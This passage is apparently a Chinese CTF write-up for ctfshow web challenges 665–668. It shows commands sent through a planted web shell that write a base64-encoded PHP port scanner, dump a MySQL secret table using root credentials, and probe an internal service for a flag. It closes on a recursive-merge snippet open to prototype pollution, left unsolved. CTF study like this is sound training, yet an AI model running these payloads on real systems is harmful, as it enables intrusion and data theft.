a=echo `curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=file_put_contents('scan.php',base64_decode('PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9'));" "http://oa:8888/assets/shell.php"`;

//base64:
<?php
highlight_file(__FILE__);
for($i=0;$i<65535;$i++) {
  $t=stream_socket_server("tcp://0.0.0.0:".$i,$ee,$ee2);
  if($ee2 === "Address already in use") {
    var_dump($i);
  }
}
```

新发现了3000，9000端口

![image-20220330175852219](https://img-blog.csdnimg.cn/img_convert/c11678170ba54bda6429f178ce8a8cfc.png)



# 666

open_basedir绕不过去，ban了chdir

```
/var/www/html:/tmp:/var/oa/
```

连接数据库

```
a=echo `curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d @/tmp/mysql.txt "http://oa:8888/assets/shell.php"`;
```

mysql.txt

```
1=$conn = new mysqli('localhost','root','root','ctfshow');
$res = $conn->query("select * from ctfshow_secret");
if($res){
	$row=$res->fetch_array(MYSQLI_BOTH);
}
echo $row[0];
$conn->close();
```



# 667

3000端口

```
a=echo `curl "http://172.2.39.5:3000/"`;
```

result

```
<!DOCTYPE html><html><head><title>ctfshow</title><link rel="stylesheet" href="/stylesheets/style.css"><script rel="javascript" href="/javascripts/jquery.js"></script></head><body><h1>ctfshow</h1><p>还是被你找到啦，flag给你flag_667=ctfshow{503a075560764e3d116436ab73d7a560}</p><p>不过你还需要rce me，绝望吗？ </p><p>ctfshow</p></body></html>
```

# 668

题目给了源码

```
/login

utils.copy(user.userinfo,req.body);

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

后面的操作不来了，回头补吧

wp：[CTFshow web入门 终极考核 (shimo.im)](https://shimo.im/docs/3XYdJp3RwQw6kHCx/read)



